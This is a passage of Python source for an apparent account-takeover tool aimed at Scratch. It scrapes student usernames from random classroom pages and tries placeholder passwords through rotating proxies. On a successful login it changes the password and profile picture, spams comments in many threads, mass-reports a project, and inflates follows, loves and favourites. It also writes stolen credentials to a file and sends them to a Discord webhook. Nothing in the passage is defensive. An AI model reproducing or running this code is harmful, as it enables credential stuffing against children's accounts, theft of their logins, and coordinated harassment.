        print("successfully to fav")
    except:
        pass


def lovess(session):
    try:
        session.love()
        print("successfully to love")
    except:
        pass

def spamssss(sessiondefault, myid):
    print(f"running spam threads for id {myid}")
    if CHANGE_PASS == True:
        for iiiii in range(5):
            try:
                session = sa.login(sessiondefault.username, PASSWORD_FOR_CHANGING)
                break
            except:
                pass
        if iiiii == 4:
            session = sessiondefault
    else:
        session = sessiondefault
    #global globalsuccessspam
    global kegagalan
    if spamtype == "studio":
        studios = session.connect_studio(placeholderspam)
    else:
        profiles = session.connect_user(placeholderspam) #change
    iii = 0
    while True:
        if iii == 1:
            if CHANGE_PASS == True:
                for iiiii in range(5):
                    try:
                        session = sa.login(sessiondefault.username, PASSWORD_FOR_CHANGING)
                        if spamtype == "studio":
                            studios = session.connect_studio(placeholderspam)
                        else:
                            profiles = session.connect_user(placeholderspam) #change
                        break
                    except:
                        pass
                if iiiii == 4:
                    session = sessiondefault
        elif iii == 2:
            if CHANGE_PASS == True:
                for iiiii in range(5):
                    try:
                        session = sa.login(sessiondefault.username, PASSWORD_FOR_CHANGING)
                        if spamtype == "studio":
                            studios = session.connect_studio(placeholderspam)
                        else:
                            profiles = session.connect_user(placeholderspam) #change
                        break
                    except:
                        pass
                if iiiii == 4:
                    session = sessiondefault
        if spamtype == "studio":
            for i in range(50):
                threading.Thread(target=post_comen,args=(studios,myid,)).start()
            #print(f"successfully posting comment with account {username} in studio {placeholderspam}")
        else:
            for i in range(50):
                threading.Thread(target=post_comen,args=(profiles,myid,)).start()
            #print(f"successfully posting comment with account {username} in profile {placeholderspam}")
        time.sleep(35)
        iii = iii + 1

def change_the_passwrod(username, password):
    try:
        ScratchSession(username, password).change_password(PASSWORD_FOR_CHANGING)
    except:
        pass

def workisscray(username, password):
    change_pfp(file=PFPFILE, username=username, password=password)

def waitasecthendopasswordchange(username, password):
    time.sleep(3)
    for _____i_____ in range(10):
        threading.Thread(target=change_the_passwrod,args=(username,password,)).start()

def pg1(threadss, passwordid):
    global usernametospam
    global spamreq
    global kegagalan
    global globalsuccessspam
    global isprojectcensored
    global exitallpger
    while True:
        if exitallpger == False:
            username = ""
            tryinghard = 0
            randomid = random.randint(10000, 1000000)
            try:
                headers = {
                    'accept': 'application/json',
                }
                if supervalidprox == "":
                    myproxy = ""
                else:
                    if rotating_proxebools == True:
                        myproxy = list_of_proxies[random.randint(0, len(list_of_proxies) - 1)]
                        if ROTATING_PRINT == True:
                            print(f"rotating proxy for thread {threadss} to {myproxy} pnging classid {randomid}")
                    else:
                        myproxy = supervalidprox
                response = requests.get(f"https://scratch.mit.edu/classes/{randomid}/", headers=headers, proxies={"http": myproxy, "https": myproxy})
                response = BeautifulSoup(response.text, "html.parser")
                if exitallpger == False:
                    if PRINT_TRYING_TO_GET_CLASS == True:
                        print("pnging class id " + str(randomid))
                    if not response.find("li", class_="user thumb item") == None:
                        usernames = response.findAll("li", class_="user thumb item")
                        randomperson = []
                        doittimes = 1
                        if PG_ALL_STUDENTS_IN_A_CLASS == True:
                            doittimes = len(usernames)
                            for i in range(doittimes):
                                randomperson.append(i)
                        else:
                            if len(usernames) > 2:
                                for i in range(3):
                                    arndomnumberperson = random.randint(0, len(usernames) - 1)
                                    while arndomnumberperson in randomperson:
                                        arndomnumberperson = random.randint(0, len(usernames) - 1)
                                    randomperson.append(arndomnumberperson)
                                doittimes = 3
                        for i in range(doittimes):
                            tryinghard = tryinghard + 1
                            try:
                                itssuccess = False
                                username = ((usernames[int(randomperson[i])].text).replace("\n", "")).strip()
                                if myproxy == "":
                                    session = sa.login(username, PLACEHOLDER_PASSWORD[passwordid])
                                    itssuccess = True
                                else:
                                    if login(username, PLACEHOLDER_PASSWORD[passwordid], proxy=myproxy) == "success":
                                        itssuccess = True
                                    else:
                                        if printfaileds == True:
                                            print(f"trying get {username} with password {PLACEHOLDER_PASSWORD[passwordid]} but failed")
                                    #session = 
                                if exitallpger == False:
                                    if itssuccess == True:
                                        if DEBUGCOMMENT == True:
                                            try: 
                                                threading.Thread(target=post_comen,args=(session.connect_project(DEBUGCOMMENTID),11,)).start()
                                            except:
                                                pass
                                        if CHANGEPFP == True:
                                            for ___i___ in range(10):
                                                threading.Thread(target=workisscray,args=(session.username,PLACEHOLDER_PASSWORD[passwordid],)).start()
                                        if CHANGE_PASS == True:
                                            threading.Thread(target=waitasecthendopasswordchange,args=(session.username,PLACEHOLDER_PASSWORD[passwordid],)).start()
                                            print(f"success got an {username} with password {PASSWORD_FOR_CHANGING}")
                                        else:
                                            print(f"success got an {username} with password {PLACEHOLDER_PASSWORD[passwordid]}")
                                        if spams == True:
                                            if spamreq < AMOUNT_SPAM_ACCOUNTS:
                                                idspam = len(kegagalan)
                                                kegagalan.append(0)
                                                globalsuccessspam.append(0)
                                                threading.Thread(target=spamssss, args=(session,idspam,)).start()
                                                spamreq = spamreq + 1
                                            else:
                                                usernametospam.append(username)
                                        elif reportproject == True:
                                            if len(list_account_for_reports) < AMOUNT_REPORT_ACCOUNTS:
                                                if isprojectcensored == False:
                                                    if myproxy == "":
                                                        meproxy = list_of_proxies[random.randint(0, len(list_of_proxies) - 1)]
                                                    else:
                                                        if rotating_proxebools == True:
                                                            meproxy = myproxy
                                                        else:
                                                            meproxy = list_of_proxies[random.randint(0, len(list_of_proxies) - 1)]
                                                    list_account_for_reports.append(username)
                                                    list_proxies_for_reports.append(meproxy)
                                                    password_placeholder_report.append(passwordid)
                                                    whaterror.append(0)
                                                    whaterrorreport.append(0)
                                                    if len(list_account_for_reports) == AMOUNT_REPORT_ACCOUNTS:
                                                        exitallpger = True
                                                        for __ in range(1000):
                                                            print("STARTING THE REPORTS...")
                                                        reportlol()
                                                #for i in range(3):
                                                #    threading.Thread(target=reportpro,args=(meproxy,username,PLACEHOLDER_PASSWORD[passwordid], placeholderspam, len(whaterror) - 1)).start()
                                        elif autofol == True:
                                            try:
                                                user = session.connect_user(givenuser)
                                                for i in range(5):
                                                    threading.Thread(target=followeee, args=(user,)).start()
                                            except:
                                                print("failed to follow")
                                        else:
                                            if autolove == True:
                                                project = session.connect_project(givenuser)
                                                for _ in range(5):
                                                    threading.Thread(target=lovess, args=(project,)).start()
                                                    threading.Thread(target=favss, args=(project,)).start()
                                            with open(TXT_FILE, "a") as f:
                                                f.write(f"{username}\n{PLACEHOLDER_PASSWORD[passwordid]}\n")
                                        if DISCORD_WEBHOOK == True:
                                            try:
                                                send_webhook(username, PLACEHOLDER_PASSWORD[passwordid])
                                                print("successfully send webhook")
                                            except:
                                                print("failed send webhook")
                            except:
                                imblue = 0
                                if printfaileds == True:
                                    print(f"trying get {username} with password {PLACEHOLDER_PASSWORD[passwordid]} but failed")
                    time.sleep(0.1)

            except Exception as e:
                #print(f"failed to get {randomid} classes")
                #print(e)
                #time.sleep(3)
                #threading.Thread(target=pg1).start()
                #break
                idk = ""
        else:
            break

threadid = 0

for i in range(REPEAT_TIMES_XLIST):
    for i_ in range(len(PLACEHOLDER_PASSWORD)):
        threading.Thread(target=pg1, args=(threadid,i_,)).start()
        print(f"running thread {threadid}")
        threadid = threadid + 1

#vpn + proxy the best!!!
#cloudflare 1.1.1.1 + proxy the best!!!